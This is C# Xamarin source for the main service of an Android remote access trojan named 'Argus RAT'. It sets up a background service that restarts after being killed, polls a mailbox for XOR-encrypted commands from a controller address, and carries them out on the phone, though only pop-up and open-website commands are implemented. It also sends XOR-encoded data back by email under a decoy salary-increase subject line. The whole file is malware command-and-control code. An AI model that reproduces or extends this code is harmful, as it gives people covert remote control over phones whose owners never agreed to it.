using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

using Android.App;
using Android.Content;
using Android.OS;
using Android.Runtime;
using Android.Views;
using Android.Widget;

using System.Threading;
using System.Security.Cryptography;
using System.Net.Mail;

/* * * * * * * * * * * * * * * * * * * * *\
 * Using OpenPOP.NET Email Plug-In       *
 * Website: http://hpop.sourceforge.net  *
\* * * * * * * * * * * * * * * * * * * * */
using OpenPop.Pop3;

namespace Argus___RAT
{
    [Service]
    public class MainService : Service
    {
        // Initialize global values
        Globals glob = new Globals();

        /// <summary>
        /// The Entry Point of our MainService
        /// </summary>
        public override StartCommandResult OnStartCommand(Android.Content.Intent intent, StartCommandFlags flags, int startId)
        {
            // Run the Setup in a seperate Thread
            var t = new Thread(() => { ReceiveCommands(); });
            t.Start();

            // Restart Service after being closed due to low memory
            return StartCommandResult.Sticky;
        }

        /// <summary>
        /// Main loop; receives all commands
        /// </summary>
        private void ReceiveCommands()
        {
            // Mmh, back to work... Ok, what's first to do? Oh yeah, getting Instructions!
            Random rand = new Random();
            while (true)
            {
                List<OpenPop.Mime.Message> messages = ReceiveMails();
                if (messages == null)
                {
                    // Sleep for 5-10 seconds
                    Thread.Sleep(rand.Next(5000, 10000));

                    continue;
                }

                foreach (OpenPop.Mime.Message msg in messages)
                {
                    // Test if mail is sent by the Server. WARNING: Sender can easily be spoofed!
                    if (msg.Headers.From.ToString() == glob.ServerMailAddress)
                    {
                        String cmd = DecryptMail(msg);
                        if (cmd == null)
                            continue;

                        // Start in another thread -> Main thread doesn't hang if Command thread needs some time...
                        var t = new Thread(() => { HandleCommand(cmd); });
                        t.Start();
                    }
                }

                // Sleep for 5-10 seconds
                Thread.Sleep(rand.Next(5000, 10000));
            }
        }

        /// <summary>
        /// Prepares command and forwards it to the right function
        /// </summary>
        /// <param name="command">The command to handle</param>
        private void HandleCommand(String command)
        {
            // Prepares command
            String cmd;
            String value = null;
            int pos = command.IndexOf(':');
            if (pos == -1)
            {
                cmd = command;
            }
            else
            {
                cmd = command.Substring(0, pos).ToLower();
                value = command.Substring(pos + 1, command.Length - pos - 1);
            }

            // Here is the command compared with known commands
            if (cmd == "toast")
                Commands.ShowToast(value);

            else if (cmd == "website")
                Commands.ShowWebsite(value);
        }

        /// <summary>
        /// Encrypts the given text with XOR
        /// </summary>
        /// <param name="text">The plain text</param>
        /// <returns>The encrypted String</returns>
        private String EncryptMail(String text)
        {
            if (text == null)
                return "";

            byte[] key = Encoding.UTF8.GetBytes(glob.XorKey);
            byte[] EncryptedText = Encoding.UTF8.GetBytes(text);
            for (int i = 0; i < EncryptedText.Length; i ++)
            {
                EncryptedText[i] ^= key[i % key.Length];
            }

            return Convert.ToBase64String(EncryptedText);
        }

        /// <summary>
        /// Decrypts the body of the given Mail
        /// </summary>
        /// <param name="msg">The encrypted Mail</param>
        /// <returns>The decrypted content</returns>
        private String DecryptMail(OpenPop.Mime.Message msg)
        {
            String text = msg.ToMailMessage().Body.Trim();

            if (text == null)
                return null;

            byte[] key = Encoding.UTF8.GetBytes(glob.XorKey);
            byte[] DecryptedText = Convert.FromBase64String(text);
            for (int i = 0; i < DecryptedText.Length; i++)
            {
                DecryptedText[i] ^= key[i % key.Length];
            }
            return Encoding.UTF8.GetString(DecryptedText);
        }

        /// <summary>
        /// Sends a Mail with the given parameters
        /// </summary>
        private void SendMail(String Body)
        {
            using (SmtpClient smtp = new SmtpClient(glob.MailServerSmtpAddress))
            {
                MailAddress from = new MailAddress(glob.ClientMailAddress);
                MailAddress to = new MailAddress(glob.ServerMailAddress);

                MailMessage message = new MailMessage(from, to);

                message.Subject = "What's about my salary increase?";
                message.Body = EncryptMail(Body);

                smtp.Credentials = new System.Net.NetworkCredential(glob.ClientMailAddress, glob.ClientMailPass);

                smtp.Send(message);
            }
        }

        /// <summary>
        /// Get all new Mails from Client Email Account
        /// </summary>
        /// <returns>A list of all new Emails</returns>
        private List<OpenPop.Mime.Message> ReceiveMails()
        {
            using (Pop3Client client = new Pop3Client())
            {
                try
                {
                    // Connect to the server
                    try
                    {
                        client.Connect(glob.MailServerPopAddress, glob.MailServerPort, true);
                    }
                    catch (Exception ex)
                    {
                        Commands.ShowToast(ex.ToString());
                    }

                    // Authenticate ourselves towards the server
                    client.Authenticate(glob.ClientMailAddress, glob.ClientMailPass);

                    // Get the number of messages in the inbox
                    int messageCount = client.GetMessageCount();

                    // We want to download all messages
                    List<OpenPop.Mime.Message> allMessages = new List<OpenPop.Mime.Message>(messageCount);

                    // Messages are numbered in the interval: [1, messageCount]
                    // Ergo: message numbers are 1-based.
                    // Most servers give the latest message the highest number
                    for (int i = messageCount; i > 0; i--)
                    {
                        allMessages.Add(client.GetMessage(i));
                    }

                    // Delete all messages
                    client.DeleteAllMessages();

                    // Now return the fetched messages
                    return allMessages;
                }

                catch (Exception pie)
                {
                    // Mmh... pie

                    return null;
                }
            }
        }

        public override void OnDestroy()
        {
            base.OnDestroy();

            // Cleanup code; not needed at the moment
        }

        public override IBinder OnBind(Intent intent)
        {
            // We don't need any bindings -> Return null
            return null;
        }
    }
}
